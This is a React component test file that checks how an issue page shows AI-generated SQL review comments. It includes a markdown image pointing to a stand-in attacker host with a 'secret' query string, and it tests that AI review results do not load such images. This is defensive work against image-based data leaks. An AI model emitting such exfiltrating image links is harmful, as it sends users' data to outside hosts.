import { create } from "@bufbuild/protobuf";
import { cleanup, render, screen } from "@testing-library/react";
import type { ReactNode } from "react";
import { afterEach, describe, expect, test, vi } from "vitest";
import {
  type IssueComment,
  IssueComment_ReviewMetadata_Priority,
  IssueCommentSchema,
  IssueSchema,
  ReviewRun_Type,
} from "@/types/proto-es/v1/issue_service_pb";

const ISSUE = "projects/p/issues/1";

const mocks = vi.hoisted(() => ({
  comments: [] as IssueComment[],
}));

vi.mock("react-i18next", () => ({
  initReactI18next: { type: "3rdParty", init: () => {} },
  useTranslation: () => ({ t: (key: string) => key }),
}));

vi.mock("@/components/HumanizeTs", async () => ({
  ...(await import("@/test-utils/humanizeTs")).humanizeTsStub(),
}));

vi.mock("@/api", () => ({ issueServiceClientConnect: {} }));

vi.mock("@/app/router", () => ({ useCurrentRoute: () => ({ hash: "" }) }));

vi.mock("@/components/issue-activity/IssueCommentActivity", () => ({
  ActivityRowShell: ({
    body,
    header,
    icon,
  }: {
    body: ReactNode;
    header: ReactNode;
    icon: ReactNode;
  }) => (
    <li data-testid="review-row">
      {icon}
      <div data-testid="row-header">{header}</div>
      {body}
    </li>
  ),
  CommentCreator: () => null,
  CommentIconBadge: ({ icon }: { icon: ReactNode }) => icon,
  canEditIssueComment: () => false,
  IssueCommentRow: ({ body }: { body: ReactNode }) => (
    <li data-testid="comment-row">{body}</li>
  ),
}));

vi.mock("@/components/UserAvatar", () => ({ UserAvatar: () => null }));

vi.mock("@/hooks/useAppState", () => ({
  useCurrentUser: () => ({ email: "me@example.com", title: "Me" }),
}));

vi.mock("@/hooks/usePrincipal", () => ({
  principalLabel: () => "creator",
  usePrincipal: () => undefined,
}));

vi.mock("@/hooks/useProjectByName", () => ({
  useProjectByName: () => undefined,
}));

vi.mock("@/stores", () => ({ pushNotification: vi.fn() }));

vi.mock("@/stores/app", () => {
  const state = {
    batchGetOrFetchUsers: vi.fn(async () => undefined),
    fetchIssueCommentTimeline: vi.fn(async () => undefined),
    getIssueComments: () => mocks.comments,
    projectsByName: {},
  };
  const useAppStore = (selector: (s: typeof state) => unknown) =>
    selector(state);
  useAppStore.getState = () => state;
  return { useAppStore };
});

vi.mock("@/utils/iam/permission", () => ({
  hasProjectPermissionV2: () => false,
}));

vi.mock("../../plan-detail/components/PlanChangeReference", () => ({
  PlanSpecChangeReference: () => null,
}));

vi.mock("../../plan-detail/components/PlanTargetDisplay", () => ({
  PlanTargetDisplay: ({ target }: { target: string }) => <span>{target}</span>,
}));

vi.mock("../../plan-detail/hooks/usePlanChangeReferenceData", () => ({
  usePlanChangeReferenceData: () => ({}),
}));

vi.mock("../context/IssueDetailContext", () => ({
  useIssueDetailContext: () => ({
    issue: create(IssueSchema, { name: ISSUE }),
    patchState: vi.fn(),
    projectId: "p",
    setEditing: vi.fn(),
  }),
}));

import { IssueDetailCommentList } from "./IssueDetailCommentList";

const LEAK = "https://attacker.example/leak.png?q=secret";
const TEXT = `Drop risk\n\n![chart](${LEAK})`;

const comment = (name: string, reviewMetadata?: boolean) =>
  create(IssueCommentSchema, {
    name: `${ISSUE}/issueComments/${name}`,
    comment: TEXT,
    reviewMetadata: reviewMetadata
      ? {
          runType: ReviewRun_Type.AI,
          priority: IssueComment_ReviewMetadata_Priority.P1,
          targets: ["instances/i/databases/d"],
        }
      : undefined,
  });

afterEach(() => {
  cleanup();
  mocks.comments = [];
});

describe("IssueDetailCommentList", () => {
  test("renders a review result without loading its images", () => {
    mocks.comments = [comment("result", true)];
    const { container } = render(<IssueDetailCommentList />);

    expect(screen.getByText("Drop risk")).toBeDefined();
    expect(container.querySelector("img")).toBeNull();
    expect(
      container.querySelector(`a[href="${LEAK}"]`)?.textContent
    ).toBe("chart");
  });

  test("heads a review result with its reviewer, priority, and targets", () => {
    mocks.comments = [comment("result", true)];
    render(<IssueDetailCommentList />);

    expect(screen.queryByTestId("comment-row")).toBeNull();
    const header = screen.getByTestId("row-header");
    expect(header.textContent).toContain("sql-review.ai-review.self");
    expect(screen.getByTestId("review-priority").textContent).toBe("P1");
    expect(screen.getByTestId("review-targets").textContent).toContain(
      "instances/i/databases/d"
    );
  });

  test("renders a member's comment with its images, as before", () => {
    mocks.comments = [comment("member")];
    const { container } = render(<IssueDetailCommentList />);

    expect(screen.getByTestId("comment-row")).toBeDefined();
    expect(screen.queryByTestId("review-row")).toBeNull();
    expect(container.querySelector("img")?.getAttribute("src")).toBe(LEAK);
  });
});
